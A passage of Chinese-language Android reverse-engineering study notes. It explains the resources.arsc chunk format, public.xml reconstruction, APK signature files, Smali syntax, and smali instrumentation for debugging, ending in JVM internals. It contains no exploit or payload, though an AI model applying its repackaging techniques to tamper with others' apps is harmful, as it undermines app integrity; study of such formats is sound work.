<application>元素是必需的，它们都必须存在并且只能出现一次。</p><ul><li><strong>resource</strong></li></ul><p>Resources.arsc文件格式是由一系列的chunk构成，每一个chunk均包含如下结构的ResChunk_header.</p><ol><li>chunk的基本信息</li></ol><table><thead><tr><th>字段名</th><th>含义</th><th>长度</th></tr></thead><tbody><tr><td>type</td><td>当前这个chunk的类型</td><td>2字节</td></tr><tr><td>headerSize</td><td>当前这个chunk的头部大小</td><td>2字节</td></tr><tr><td>size</td><td>当前这个chunk的大小</td><td>4字节</td></tr></tbody></table><ol start="2"><li>资源索引表的头部信息</li></ol><table><thead><tr><th>字段名</th><th>含义</th><th>长度</th></tr></thead><tbody><tr><td>header</td><td>标准的Chunk头部信息格式</td><td>8字节：0x0002</td></tr><tr><td>packageCount</td><td>被编译的资源包的个数，Apk中可以包含多个资源包，默认就1个</td><td>4字节</td></tr></tbody></table><ol start="3"><li>资源项的值字符串资源池</li></ol><p>紧跟着资源索引表头部的是资源项的值字符串资源池,这个字符串资源池包含了所有的在资源包里面所定义的资源项的值字符串,字符串资源池头部的结构如下：</p><table><thead><tr><th>字段名</th><th>含义</th><th>长度</th></tr></thead><tbody><tr><td>header</td><td>标准的Chunk头部信息格式</td><td>8字节：0x0001</td></tr><tr><td>stringCount</td><td>字符串的个数</td><td>4字节</td></tr><tr><td>styleCount</td><td>字符串样式的个数</td><td>4字节</td></tr><tr><td>flags</td><td>字符串的属性,可取值包括0x000(UTF-16),0x001(字符串经过排序)、0X100(UTF-8)和他们的组合值</td><td>4字节</td></tr><tr><td>stringsStart</td><td>字符串内容块相对于当前Chunk头部的距离</td><td>4字节*stringCount</td></tr><tr><td>stylesStart</td><td>字符串样式块相对于当前Chunk头部的距离</td><td>4字节*styleCount</td></tr><tr><td>stringOffsetArray</td><td>每个字符串相对于stringsStart位置的偏移</td><td>4字节*stringCount</td></tr><tr><td>styleOffsetArray</td><td>每个style串相对于stylesStart位置的偏移</td><td>4字节*stylesCount</td></tr><tr><td>strings</td><td>字符串内容池</td><td>每个串的前2个字节标识字符串长度，utf8的字符串以0x00结尾，长度不包含结束符</td></tr><tr><td>styles</td><td>样式串内容池</td><td></td></tr><tr><td><code>字符串的长度计算比较特殊：length = byte[1] &amp; 0x7f，并且长只包含有效字符的长度，不包含结束符0x00。</code></td><td></td><td></td></tr></tbody></table><ol start="4"><li>Package数据块</li></ol><p>接着资源项的值字符串资源池后面的部分就是Package数据块,这个数据块记录编译包的元数据,头部结构如下：</p><table><thead><tr><th>字段名</th><th>含义</th><th>长度</th></tr></thead><tbody><tr><td>header</td><td>标准的Chunk头部信息格式</td><td>8字节：0x0200</td></tr><tr><td>pkgId</td><td>用户包的值Package Id为0X7F,系统资源包的Package Id为0X01</td><td>4字节</td></tr><tr><td>packageName</td><td>包名</td><td>128*2字节</td></tr><tr><td>typeString</td><td>类型字符串资源池 相对头部的偏移</td><td>4字节</td></tr><tr><td>lastPublicType</td><td>最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值</td><td>设置为类型字符串资源池的元素个数</td></tr><tr><td>keyStrings</td><td>资源项名称字符串相对头部的偏移</td><td>4字节</td></tr><tr><td>lastPublicKey</td><td>最后一个导出的Public资源项名称字符串在资源项名称字符串资源池中的索引，资源项名称字符串资源池的元素个数</td><td>4字节</td></tr></tbody></table><p>PackageChunk数据块头部0x0120字节 (8+4+128*2+16+4 = 0120 最后4字节无用)，数据块部分包含：</p><table><thead><tr><th>DataBlock</th><th>含义</th></tr></thead><tbody><tr><td>TypeStringPool</td><td>类型字符串 资源池</td></tr><tr><td>KeyStringPool</td><td>资源项名称字符串</td></tr><tr><td>ResTableTypeSpec</td><td>类型规范数据块</td></tr><tr><td>ResTableTypeInfo</td><td>类型资源项数据块</td></tr></tbody></table><ol start="5"><li>类型规范数据块 RES_TABLE_TYPE_SPEC_TYPE</li></ol><p>类型规范数据块用来描述资源项的配置差异性。通过这个差异性描述，我们就可以知道每一个资源项的配置状况。知道了一个资源项的配置状况之后，Android资源管理框架在检测到设备的配置信息发生变化之后，就可以知道是否需要重新加载该资源项。类型规范数据块是按照类型来组织的，也就是说，每一种类型都对应有一个类型规范数据块。其数据块头部结构如下。</p><p>DataBlock   含义<br>header  标准的Chunk头部信息格式  8字节：0x0202<br>typeId  标识资源的Type ID,Type ID是指资源的类型ID，资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID   1字节<br>res0    保留,始终为0 1字节<br>res1    保留,始终为0 2字节<br>entryCount  等于本类型的资源项个数,指名称相同的资源项的个数。   4字节<br>entryConfigs    配置项数组   entryConfigs * 4字节<br>6. 资源类型项数据块 RES_TABLE_TYPE_INFO_TYPE<br>类型资源项数据块用来描述资源项的具体信息, 这样我们就可以知道每一个资源项的名称、值和配置等信息。类型资源项数据同样是按照类型和配置来组织的,也就是说,一个具有n个配置的类型一共对应有n个类型资源项数据块。其数据块头部结构如下</p><p>DataBlock   含义<br>header  标准的Chunk头部信息格式  8字节：0x0201<br>typeId  标识资源的Type ID    1字节<br>res0    保留,始终为0 1字节<br>res1    保留,始终为0 2字节<br>entryCount  等于本类型的资源项个数,指名称相同的资源项的个数    4字节<br>entriesStart    等于资源项数据块相对头部的偏移值    4字节<br>resConfig   指向一个ResTable_config,用来描述配置信息,地区,语言,分辨率等，是union类型    大小由ResTableConfig#size字段指定，正常是56个字节<br>entryOffsets    属于当前InfoChunk的Entry偏移数组 entryCount * 4字节<br>tableEntries    具体的Entry定义，根据ResTableEntry#flags区分类型：=FLAG_COMPLEX表示ResTableMapEntry，否则为ResTableValueEntry  根据实际的类型确定<br>如果检查到 entryOffsets[i] == 0xffffffffL 表示这个位置没有entry，应该跳过继续读取下一个。这个地方还要明确一下 RES_TABLE_TYPE_SPEC_TYPE 和 RES_TABLE_TYPE_INFO_TYPE 这两种TypeChunk的关系，下面的表格是按文件流的顺序解析得到结果，可以清楚地说明问题：</p><table><thead><tr><th>SequenceId</th><th>ChunkType</th><th>TypeID</th><th>TypeName</th><th>EntryCount</th></tr></thead><tbody><tr><td>0</td><td>RES_TABLE_TYPE_SPEC_TYPE</td><td>0x01</td><td>attr</td><td>228</td></tr><tr><td>1</td><td>RES_TABLE_TYPE_INFO_TYPE</td><td>0x01</td><td>attr</td><td>228</td></tr><tr><td>2</td><td>RES_TABLE_TYPE_SPEC_TYPE</td><td>0x02</td><td>drawable</td><td>95</td></tr><tr><td>3</td><td>RES_TABLE_TYPE_INFO_TYPE</td><td>0x02</td><td>drawable</td><td>95</td></tr><tr><td>4</td><td>RES_TABLE_TYPE_SPEC_TYPE</td><td>0x02</td><td>drawable</td><td>95</td></tr><tr><td>5</td><td>RES_TABLE_TYPE_INFO_TYPE</td><td>0x02</td><td>drawable</td><td>95</td></tr><tr><td>6</td><td>RES_TABLE_TYPE_SPEC_TYPE</td><td>0x02</td><td>drawable</td><td>95</td></tr><tr><td>7</td><td>RES_TABLE_TYPE_INFO_TYPE</td><td>0x02</td><td>drawable</td><td>95</td></tr><tr><td>8</td><td>RES_TABLE_TYPE_SPEC_TYPE</td><td>0x03</td><td>mipmap</td><td>1</td></tr><tr><td>9</td><td>RES_TABLE_TYPE_INFO_TYPE</td><td>0x03</td><td>mipmap</td><td>1</td></tr><tr><td>10</td><td>RES_TABLE_TYPE_SPEC_TYPE</td><td>0x03</td><td>mipmap</td><td>1</td></tr><tr><td>11</td><td>RES_TABLE_TYPE_INFO_TYPE</td><td>0x03</td><td>mipmap</td><td>1</td></tr><tr><td>12</td><td>RES_TABLE_TYPE_SPEC_TYPE</td><td>0x03</td><td>mipmap</td><td>1</td></tr><tr><td>13</td><td>RES_TABLE_TYPE_INFO_TYPE</td><td>0x03</td><td>mipmap</td><td>1</td></tr><tr><td>…</td><td>…</td><td>0x04 0x05 0x06 0x07 0x08 0x09 0x0a 0x0b 0x0c</td><td>layout anim string dimen style bool color id interger</td><td>…</td></tr></tbody></table><p><code>RES_TABLE_TYPE_SPEC_TYPE 的数量和当前APP使用到的资源类型数相同（attr、drawable、mipmap、layout、anim、string、dimen、style、bool、color、id、interger、xml、raw、array、menu），每个RES_TABLE_TYPE_SPEC_TYPE块之后都会跟着若干个RES_TABLE_TYPE_INFO_TYPE块，而具体的数量实际上对应的就是这种类型的资源有几种配置。</code></p><p>最后再看一下最后一列的EntryCount，如果把每种RES_TABLE_TYPE_SPEC_TYPE的EntryCount加起来，总数正好就是public.xml中&lt;public …/&gt;的条目数量。</p><p>不能保证每个资源都正好提供N种类型，比如说mipmap类型的图片资源，a图片提供了全部配置hdpi/mdpi/xhdpi/xxhdpi/xxxhdpi，b图片只提供了mdpi/xxhdpi，那这种差异就由entryOffsets[i]数组的具体位置来标识了，如果 entryOffsets[i]==0xffffffffL 就意味着这种类型的资源在当前这种配置下没有提供，读取时应该忽略。因为具体的资源Entry在文件中都是紧密排列的，所以同一个资源在不同配置之间的偏移下标不一定相同，完全取决于其他资源配置缺失的情况。</p><table><thead><tr><th>配置</th><th>Offset[] for A</th><th>Offset[] for B</th></tr></thead><tbody><tr><td>hdpi</td><td>0x111111</td><td>0xffffffffL 缺失</td></tr><tr><td>mhdpi</td><td>0x111111</td><td>0x111222</td></tr><tr><td>xhdpi</td><td>0x120000</td><td>0x111333</td></tr><tr><td>xxmhdpi</td><td>0x110000</td><td>0xffffffffL 缺失</td></tr><tr><td>xxxmhdpi</td><td>0x120000</td><td>0xffffffffL 缺失</td></tr></tbody></table><p>这个具体运行一下Demo代码就知道了，RES_TABLE_TYPE_SPEC_TYPE 和 RES_TABLE_TYPE_INFO_TYPE 这两个Chunk应该算是最复杂的了，搞清楚后下一步生成public.xml就方便了。</p><ol start="7"><li>生成public.xml<br>构造public.xml要提供下面几个Entry属性：</li></ol><p>属性  含义  保存字段<br>属性类型名称  在ResTableTypeInfoChunk中根据typeId索引从typeStringPool获取：atrr/drawble/mipmap…<br>属性名称    在ResTableEntry中根据key.index索引从keyStringPool获取，具体在子类实现    ResTableEntry#key#index<br>资源包ID   0x01系统资源，0x7f用户资源，由PackageChunk保存   ResTablePackageChunk#pkgId<br>资源类型ID  [0x01, 0x10]下标从1开始，共16种，保存在对应的TypeChunk中    ResTableTypeInfoChunk#typeId<br>资源ID    Entry所在的数组下标，顺序从文件读取Entry的时候记录在具体的ResTableEntry中    ResTableEntry#entryId<br>上面提到同一种类型的资源对应的 RES_TABLE_TYPE_INFO_TYPE_CHUNK 会有多个，个数等于配置最多的资源类型数，同一种资源的ID是相同的，所以要避免产生重复的Entry，同时对于配置缺失的情况，要使用其他有配置的Chunk来补充。所以格式化输出时对于同一种资源，需要从多个同类别的 RES_TABLE_TYPE_INFO_TYPE_CHUNK 中找到一个非空的，顺序构造publix.xml。</p><p>public.xml文件中的id是4字节的16进制数，由pkgId, typeId, entryId合成：id = pkgId &lt;&lt; 24 | typeIdId &lt;&lt; 16 | (entryId &amp; 0xffff)，最后就是构造类似<public type="attr" name="drawerArrowStyle" id="0x7f010000" />这样的Entry项了，可以和apktool反编译出来的对比，应该是完全相同的。</p><ol start="8"><li>由public.xml的key找到value值</li></ol><ul><li><strong>Meta</strong><br>MANIFEST.MF、CERT.SF、INDEX.LIST、CERT.RSA</li></ul><p>MANIFEST.MF（摘要文件）：程序遍历APK包中的所有文件，对非文件夹非签名文件的文件，逐个用SHA1生成摘要信息，再用Base64进行编码。如果APK包的文件被修改，在APK安装校验时，被修改的文件与MANIFEST.MF的校验信息不同，程序将无法正常安装。</p><p>CERT.SF（对摘要文件的签名文件）：对于生成的MANIFEST.MF文件利用SHA1-RSA算法对开发者的私钥进行签名。在安装时只有公共密钥才能对其解密。解密之后将其与未加密的摘要信息进行比对，如果相符则文件没有被修改。</p><p>INDEX.LIST APK索引文件目录</p><p>CERT.RSA   保存公钥、加密算法等信息。</p><p>在APK进行安装时，可以通过MANIFEST.MF文件开始的环环相扣来保证APK的安全性。</p><h3 id="1-1-2-静态分析工具Jeb、Jadx、GDA、010editor"><a href="#1-1-2-静态分析工具Jeb、Jadx、GDA、010editor" class="headerlink" title="1.1.2 静态分析工具Jeb、Jadx、GDA、010editor"></a>1.1.2 静态分析工具Jeb、Jadx、GDA、010editor</h3><h3 id="1-1-3-熟悉Smali语言的指令格式、寄存器、数据-流程等操作等指令集"><a href="#1-1-3-熟悉Smali语言的指令格式、寄存器、数据-流程等操作等指令集" class="headerlink" title="1.1.3 熟悉Smali语言的指令格式、寄存器、数据/流程等操作等指令集"></a>1.1.3 熟悉Smali语言的指令格式、寄存器、数据/流程等操作等指令集</h3><ol><li>指令格式</li></ol><ul><li><p>baksmali将dex文件反编译成smali文件</p></li><li><p>smali文件头三行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.class&lt;访问权限&gt;[修饰符]&lt;类名&gt;</span><br><span class="line">.super&lt;父类名&gt;</span><br><span class="line">.<span class="built_in">source</span>&lt;源文件名&gt;</span><br></pre></td></tr></table></figure></li><li><p>静态字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.field &lt;访问权限&gt; static [修饰关键字]&lt;字段名&gt;:&lt;字段类型&gt;</span><br></pre></td></tr></table></figure></li><li><p>实例字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.field &lt;访问权限&gt; [修饰关键字]&lt;字段名&gt;:&lt;字段类型&gt;</span><br></pre></td></tr></table></figure><p>  修饰关键字:<br>  synthetic : 表名它是合成的<br>  字段名<br>  sn: 字符串类型</p></li><li><p>直接方法(Smali中的函数)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.method &lt;访问权限&gt; [修饰关键字] &lt;方法原型&gt;</span><br><span class="line">    &lt;.<span class="built_in">local</span>&gt;  <span class="comment">#局部变量个数</span></span><br><span class="line">    [.parameter] <span class="comment">#.parameters -&gt; 指定参数个数不同,.parameter -&gt; 使用一个参数</span></span><br><span class="line">    [.prologue] <span class="comment"># 代码开始处,混淆以后一般会去除</span></span><br><span class="line">    [.line] <span class="comment"># 指定代码体行号,混淆后可能去除</span></span><br><span class="line">    &lt;代码体&gt;</span><br><span class="line">    .end method</span><br></pre></td></tr></table></figure></li><li><p>虚方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.virtual methods</span><br></pre></td></tr></table></figure></li><li><p>接口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.implments &lt;接口名&gt; </span><br></pre></td></tr></table></figure></li><li><p>注解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.annotations [注解类型] &lt;注解类名&gt;</span><br><span class="line">    [注解字段 = 值]</span><br><span class="line">.end annotations</span><br></pre></td></tr></table></figure><p>  注解作用范围可以是类、方法、字段.<br>  类: smali文件中<br>  方法或字段: 方法或字段定义中</p></li><li><p>内部类<br>  包含内部类的反编译后会出现两个文件<br>  Outer.samli<br>  Outer$Inner.smali<br>  this$0: 内部类自动保留的一个指向所在外部类的引用, 0表示层数,在里面一层就+1<br>  this$X: 被指定了synthetic属性,表明是被编译合成<br>  注: 对于非静态方法,会隐含使用p0寄存器当做类的this引用.如p0表示MainActivity$x自身的引用,<br>  p1:表示MainActivity的引用,p2:表示sn字符串的引用</p></li><li><p>监听器()<br>  <code>临时使用一次,没有复用价值,多采用匿名内部类使用</code><br>  点击事件响应OnClickListener,长按事件响应OnLongClickListener,ListView列表点击事件响应OnItemSelected-Listener…</p></li></ul><ol start="2"><li><p>寄存器</p><ul><li>本地寄存器以v开头数字结尾，如：v0，v1…</li><li>参数寄存器以p开头数字结尾，如：p0，p1…</li><li>p0 不一定是函数中的第一个参数，在非static函数中，p0就是“this”的意思，后面的才为函数参数</li></ul></li><li><p>Smali中的数据类型<br> v        void只能用于返回值类型<br> Z        boolean类型<br> B        byte类型<br> S        shot类型<br> C        char类型<br> I          int类型<br> J         long类型<br> F        float类型<br> D        double类型<br> 数组类型：   [  <br> [后面跟着基本数据类型<br> 如：float []    ===&gt;    [F<br> char [][]    ===&gt;      [[C<br> 对象类型：L&lt;包名&gt;/&lt;类名&gt;;<br> 分号表示对象结束<br> String对象 ===&gt; Ljava/lang/String;<br> 内部类前面加 “ $ ” 符号：L&lt;包名&gt;/&lt;类名&gt;$&lt;内部类名&gt;;</p></li><li><p>Smali中的成员变量<br> 格式：.field [访问权限] [修饰关键字] &lt;变量名&gt;:&lt;数据类型&gt;<br> 成员变量的获取指令：iget、sget、iget-boolean、sget-boolean、iget-object、sget-object等<br> 成员变量的操作指令：iput、sput、iput-boolean、sput-boolean、iput-object、sput-object等<br> 除了带有-object和-boolean之外的指令操作的是基本数据类型</p><p> get指令的使用：</p><pre><code> 如：sget-object v0, Lcom/aaa;-&gt;ID:Ljava/lang/String; 表示的是获取String类型的ID变量的值，并将其存放到v0寄存器中 前面为该变量所属类的类型，在冒号后面表示变量的数据类型，“-&gt;”表示所属关系 iget-object v0,p0,Lcom/aaa;-&gt;view:Lcom/aaa/view; p0为该变量所在类的实例，即“this” 获取数组的话，用aget-object</code></pre><p> put指令的使用：</p><pre><code> const/4 v1, 0x0 sput-object v3, Lcom/aaa;-&gt;timer:Lcom/aaa/timer;    ===&gt;     this.timer=null; 因为给object对象赋值，所以为null .local v0, args:Landroid/os/Message; const/4 v1, 0x12 iput v1, v0, Landroid/os/Message;-&gt;what:I    ===&gt;     args.what=18; 实例化对象Message为args并存放在寄存器v0中，给v1赋值为0x12，然后使用iput将v1的值赋给args对象的what属性</code></pre></li><li><p>其他其他基本语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.invoke-super      <span class="comment">#调用父类方法</span></span><br><span class="line">const/high16 v0, 0xadf1     <span class="comment">#将0xadf1存放到寄存器v0中</span></span><br><span class="line">invoke-direct      <span class="comment">#调用函数</span></span><br><span class="line">return-void       <span class="comment">#函数返回void</span></span><br><span class="line">new-instance      <span class="comment">#创建实例</span></span><br><span class="line">iput-object      <span class="comment">#给对象赋值</span></span><br><span class="line">iget-object      <span class="comment">#调用对象</span></span><br><span class="line">invoke-static       <span class="comment">#调用静态函数</span></span><br></pre></td></tr></table></figure></li><li><p>Smali中的条件分支</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if-eq v1, v2:cond_*    ===&gt; 如果v1=v2则跳转到:cond_*</span><br><span class="line">if-ne v1, v2:cond_*    ===&gt; 如果v1≠v2则跳转到:cond_*</span><br><span class="line">if-lt v1, v2:cond_*      ===&gt; 如果v1&lt;v2则跳转到:cond_*</span><br><span class="line">if-le v1, v2:cond_*     ===&gt; 如果v1&lt;=v2则跳转到:cond_*</span><br><span class="line">if-ge v1, v2:cond_*    ===&gt; 如果v1&gt;=v2则跳转到:cond_*</span><br><span class="line">if-gt v1, v2:cond_*     ===&gt; 如果v1&gt;v2则跳转到:cond_*</span><br><span class="line">if-eqz v1:cond_*        ===&gt; 如果v1=0则跳转到:cond_*</span><br><span class="line">if-nez v1:cond_*        ===&gt; 如果v1≠0则跳转到:cond_*</span><br><span class="line">if-ltz v1:cond_*          ===&gt; 如果v1&lt;0则跳转到:cond_*</span><br><span class="line">if-lez v1:cond_*         ===&gt; 如果v1&lt;=0则跳转到:cond_*</span><br><span class="line">if-gtz v1:cond_*         ===&gt; 如果v1&gt;0则跳转到:cond_*</span><br><span class="line">if-gez v1:cond_*        ===&gt; 如果v1&gt;=0则跳转到:cond_*</span><br></pre></td></tr></table></figure></li><li><p>Smali中的函数调用<br> 函数分为两种：direct和virtual</p><pre><code> `direct method表示private.   virtual method表示public、protected`</code></pre><p> 在函数调用时有：invoke-direct、invoke-virtual、invoke-static、invoke-super等<br> 当参数多于4个的时候使用：invoke-xxx/range<br> invoke-static：用于调用静态函数</p><pre><code> invoke-static &#123;&#125;, Lcom/aaa;-&gt;Check()Z     &#123;&#125;：里面的东西表示传入函数的实例+参数列表，由于该static函数不需要任何参数所以里面为空     const-string v0, &quot;NIUBI&quot;     invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V         这是调用static void System.loadLibrary(String)方法，传入的参数为“NIUBI”</code></pre><p> invoke-super：调用父类方法，一般用于调用onCreate、onDestroy等方法<br> invoke-direct：调用private函数</p><pre><code> invoke-direct &#123;p0&#125;, Landroid/app/TabActivity;-&gt;&lt;init&gt;()V 这里的&lt;init&gt;就是定义在TabActivity中的private函数 invoke-virtual：调用的是public、protected函数 sget-object v0, Lcom/aaa;-&gt;bbb:Lcom/ccc; invoke-virtual &#123;v0, v1&#125;, Lcom/ccc;-&gt;Message(Ljava/lang/Object;)V v0是Lcom/ccc v1是传给Message方法的Ljava/lang/Object;参数 public void ccc.Message(Object) invoke-xxxx/range：当方法的参数多于4个的时候使用 在调用函数的时候通常会有返回结果，如果返回值非void，则需要使用 move-result （返回基本数据类型）和move-result-object （返回对象） const-string v0, &quot;Eric&quot; invoke-static &#123;v0&#125;, Lcmb/pbi;-&gt;t(Ljava/lang/String;)Ljava/lang/String; move-result-object v2 v2就保存了t方法的返回值String类型</code></pre></li></ol><h3 id="1-1-4-配置调试环境并掌握常见的动态调试方法如代码注入、栈追踪、DDMS"><a href="#1-1-4-配置调试环境并掌握常见的动态调试方法如代码注入、栈追踪、DDMS" class="headerlink" title="1.1.4 配置调试环境并掌握常见的动态调试方法如代码注入、栈追踪、DDMS"></a>1.1.4 配置调试环境并掌握常见的动态调试方法如代码注入、栈追踪、DDMS</h3><ol><li>代码注入<br><code>插桩时注意：不要影响程序上下文，即插入的代码中，不能影响下面代码中使用的寄存器或者变量。</code></li></ol><ul><li>toast 弹框提示注入<br>  const-string v0, “键入Toast提示”</li><li>log 日志注入<br>  const-string v0, “键入log提示”<br>  invoke-static {v0}, Lcom/android/killer/log;-&gt;LogStr(Ljava/lang/String;)V<br>结合DDMS的方法剖析进行log过滤</li></ul><ol start="2"><li>栈追踪<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 栈跟踪</span></span><br><span class="line">new-instance v0, Ljava/lang/Exception;</span><br><span class="line">const-string v1, <span class="string">&quot;print trace&quot;</span></span><br><span class="line">invoke-direct &#123;v0, v1&#125;, Ljava/lang/Exception; -&gt;&lt;init&gt;(Ljava/lang/String;)V</span><br><span class="line">invoke-virtual &#123;v0&#125;, Ljava/lang/Exception; -&gt;printStackTrace()V</span><br></pre></td></tr></table></figure>回编译 apk，安装，打开安装好的 apk 和 ddms 查看</li><li>DDMS(monitor)<br>先使用包名进行过滤</li></ol><h2 id="1-2-Java-hook"><a href="#1-2-Java-hook" class="headerlink" title="1.2 Java hook"></a>1.2 Java hook</h2><h3 id="1-2-1-了解JVM的基本原理如编译执行流程、虚拟机、内存、堆栈、垃圾回收"><a href="#1-2-1-了解JVM的基本原理如编译执行流程、虚拟机、内存、堆栈、垃圾回收" class="headerlink" title="1.2.1 了解JVM的基本原理如编译执行流程、虚拟机、内存、堆栈、垃圾回收"></a>1.2.1 了解JVM的基本原理如编译执行流程、虚拟机、内存、堆栈、垃圾回收</h3><ul><li><ol><li>JVM基本介绍<br>Java虚拟机（JVM）是5261Java Virtual Machine的缩写,通过仿真模拟各种计算机功能模拟来实现的。<br>Java虚拟机有自己完善的硬件架构,如处理器、堆栈、寄存器等,还具有相应的指令系统。</li></ol></li></ul><p> <strong>Java的编译和执行</strong><br> <img src="https://q0o0p.top/2021/04/23/reverse-leaning/6.png"><br> JVM被分为三个主要的子系统<br>（1）类加载器子系统<br>    加载、验证、准备和初始化这四个阶段发生的顺序是确定的，而解析阶段则不一定，它在某些情况下可以在初始化阶段之后开始，这是为了支持Java语言的运行时绑定（也成为动态绑定或晚期绑定）。另外注意这里的几个阶段是按顺序开始，而不是按顺序进行或完成，因为这些阶段通常都是互相交叉地混合进行的，通常在一个阶段执行的过程中调用或激活另一个阶段。<br>• 加载<br>    加载是类加载过程的第一个阶段，在加载阶段，虚拟机需要完成以下三件事情：<br>    ① 通过一个类的全限定名来获取其定义的二进制字节流。<br>    ② 将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。<br>    ③ 在Java堆中生成一个代表这个类的java.lang.Class对象，作为对方法区中这些数据的访问入口。相对于类加载的其他阶段而言，加载阶段（准确地说，是加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，因为开发人员既可以使用系统提供的类加载器来完成加载，也可以自定义自己的类加载器来完成加载。</p><pre><code>加载阶段完成后，虚拟机外部的 二进制字节流就按照虚拟机所需的格式存储在方法区之中，而且在Java堆中也创建一个java.lang.Class类的对象，这样便可以通过该对象访问方法区中的这些数据。</code></pre><p>• 连接<br>    1）验证：确保被加载的类的正确性<br>    验证是连接阶段的第一步，这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。验证阶段大致会完成4个阶段的检验动作：<br>    <em>文件格式验证</em>：验证字节流是否符合Class文件格式的规范；例如：是否以0xCAFEBABE开头主次版本号是否在当前虚拟机的处理范围之内、常量池中的常量是否有不被支持的类型。<br>   <em>元数据验证</em>：对字节码描述的信息进行语义分析（注意：对比javac编译阶段的语义分析），以保证其描述的信息符合Java语言规范的要求；例如：这个类是否有父类，除了java.lang.Object之外。<br>    <em>字节码验证</em>：通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。<br>    <em>符号引用验证</em>：确保解析动作能正确执行。<br>    验证阶段是非常重要的，但不是必须的，它对程序运行期没有影响，如果所引用的类经过反复验证，那么可以考虑采用-Xverifynone参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间。</p><pre><code>2）准备：为类的静态变量分配内存，并将其初始化为默认值准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，这些内存都将在方法区中分配。对于该阶段有以下几点需要注意：    ① 这时候进行内存分配的仅包括类变量（static），而不包括实例变量，实例变量会在对象实例化时随着对象一块分配在Java堆中。    ② 这里所设置的初始值通常情况下是数据类型默认的零值（如0、0L、null、false等），而不是被在Java代码中被显式地赋予的值。假设一个类变量的定义为：public static int value = 3；那么变量value在准备阶段过后的初始值为0，而不是3，因为这时候尚未开始执行任何Java方法，而把value赋值为3的putstatic指令是在程序编译后，存放于类构造器&lt;clinit&gt;（）方法之中的，所以把value赋值为3的动作将在初始化阶段才会执行3）解析：把类中的符号引用转换为直接引用    解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程，解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用点限定符7类符号引用进行。符号引用就是一组符号来描述目标，可以是任何字面量。    直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。</code></pre><p>• 初始化<br>    类初始化阶段是类加载的最后一步，前面的类加载过程中，除了在加载阶段用户用程序可以通过自定义类加载器参与之外，其余动作完全由虚拟机主导和控制。到了初始化阶段，才真正开始执行类中定义的Java程序代码（或者说字节码）。这里所有的静态变量会被赋初始值, 并且静态块将被执行。<br>    java中，对于初始化阶段，有且只有**以下五种情况才会对要求类立刻初始化：<br>    ① 使用new关键字实例化对象、访问或者设置一个类的静态字段（被final修饰、编译器优化时已经放入常量池的例外）、调用类方法，都会初始化该静态字段或者静态方法所在的类；<br>    ② 初始化类的时候，如果其父类没有被初始化过，则要先触发其父类初始化；<br>    ③ 使用java.lang.reflect包的方法进行反射调用的时候，如果类没有被初始化，则要先初始化；<br>    ④ 虚拟机启动时，用户会先初始化要执行的主类（含有main）；<br>    ⑤ jdk 1.7后，如果java.lang.invoke.MethodHandle的实例最后对应的解析结果是 REF_getStatic、REF_putStatic、REF_invokeStatic方法句柄，并且这个方法所在类没有初始化，则先初始化；<br>（2）运行时数据区<br>    运行时数据区域被划分为5个主要组件：<br>    ① 方法区 (线程共享) 常量 静态变量 JIT(即时编译器)编译后代码也在方法区存放<br>    ② 堆内存(线程共享) 垃圾回收的主要场地<br>    ③ 程序计数器 当前线程执行的字节码的位置指示器<br>    ④ Java虚拟机栈(栈内存) :保存局部变量,基本数据类型以及堆内存中对象的引用变量<br>    ⑤ 本地方法栈 (C栈):为JVM提供使用native方法的服务</p><p>（3）执行引擎<br>    分配给运行时数据区的字节码将由执行引擎执行。执行引擎读取字节码并逐段执行.<br>    ① 解释器: 解释器能快速的解释字节码，但执行却很慢。 解释器的缺点就是,当一个方法被调用多次，每次都需要重新解释。<br>    ② 编译器：JIT编译器消除了解释器的缺点。执行引擎利用解释器转换字节码，但如果是重复的代码则使用JIT编译器将全部字节码编译成本机代码。<br>    编译和解释执行的区别是：是否产生中间本地机器码。即时编译生成机器相关的中间码，可重复执行缓存效率高。<br>    解释器（减少内存）和编译器（提高速度）<br>    